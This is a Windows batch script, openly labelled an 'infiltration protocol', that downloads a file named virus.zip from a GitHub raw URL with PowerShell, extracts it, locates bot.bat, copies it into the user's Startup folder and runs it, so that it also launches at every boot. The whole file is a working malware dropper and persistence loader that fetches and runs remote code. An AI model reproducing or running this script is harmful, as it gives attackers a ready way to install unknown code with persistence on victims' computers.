@echo off
setlocal enabledelayedexpansion

echo ============================================
echo   YING-YANG EMPEROR'S INFILTRATION PROTOCOL
echo   NOTHING WILL BE ERASED
echo ============================================
echo.

:: === Raw GitHub link ===
set "url=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
set "zipfile=%TEMP%\payload.zip"
set "extractdir=%TEMP%\payload_extracted"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

echo [*] Target URL: %url%
echo [*] Temp zip destination: %zipfile%
echo [*] Extraction path: %extractdir%
echo [*] Startup folder: %startup%
echo.

:: 1. DOWNLOAD
echo [1/5] DOWNLOADING PAYLOAD...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%url%' -OutFile '%zipfile%' -UseBasicParsing; Write-Host 'Download complete.'"
if not exist "%zipfile%" (
    echo [FAIL] Download failed! Check the raw link or network.
    pause
    exit /b 1
)
echo [OK] Payload downloaded successfully.
echo [*] Zip file kept at: %zipfile%
echo.

:: 2. EXTRACT
echo [2/5] EXTRACTING ZIP FILE...
powershell -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%extractdir%' -Force; Write-Host 'Extraction complete.'"
if not exist "%extractdir%" (
    echo [FAIL] Extraction failed!
    pause
    exit /b 1
)
echo [OK] Zip extracted successfully.
echo [*] Extracted folder kept at: %extractdir%
echo.

:: 3. HUNT bot.bat
echo [3/5] HUNTING FOR bot.bat IN EXTRACTED FILES...
set "botpath="
for /r "%extractdir%" %%f in (bot.bat) do (
    if not defined botpath (
        set "botpath=%%f"
        echo [FOUND] !botpath!
    )
)
if not defined botpath (
    echo [FAIL] bot.bat not found! Listing all extracted files:
    dir /s /b "%extractdir%\*"
    pause
    exit /b 1
)
echo [OK] bot.bat located.
echo.

:: 4. PLANT INTO STARTUP
echo [4/5] PLANTING bot.bat INTO STARTUP FOLDER...
copy /y "!botpath!" "%startup%\bot.bat"
if exist "%startup%\bot.bat" (
    echo [OK] bot.bat successfully planted in Startup!
) else (
    echo [FAIL] Copy to Startup failed!
    pause
    exit /b 1
)
echo.

:: 5. EXECUTE
echo [5/5] EXECUTING bot.bat NOW...
start "" "%startup%\bot.bat"
echo [OK] bot.bat launched in new process.
echo.

echo ============================================
echo   MISSION COMPLETE - ALL FILES PRESERVED
echo   - Zip: %zipfile%
echo   - Extracted: %extractdir%
echo   - Startup: %startup%\bot.bat
echo   bot.bat will execute on every system boot.
echo ============================================
pause
exit
